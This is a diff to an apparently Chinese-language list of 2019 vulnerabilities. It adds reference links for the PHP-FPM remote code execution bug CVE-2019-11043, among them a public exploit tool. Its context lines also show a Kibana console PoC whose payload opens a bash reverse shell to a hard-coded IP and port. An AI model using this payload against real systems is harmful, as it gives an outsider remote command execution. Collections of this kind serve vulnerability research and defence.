@@ -9,6 +9,11 @@ share: true
 
 2019
 ---
+1. **【20191023】PHP远程命令执行漏洞CVE-2019-11043**
+    - <https://bugs.php.net/bug.php?id=78599>
+    - <https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/>
+    - <https://github.com/neex/phuip-fpizdam>
+
 1. **【20191017】Kibana < 6.6.0 控制台命令执行漏洞**
     - <https://mp.weixin.qq.com/s/R4rzYDp9-q2NYAOvPK951A>
     - PoC Part1: `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')`
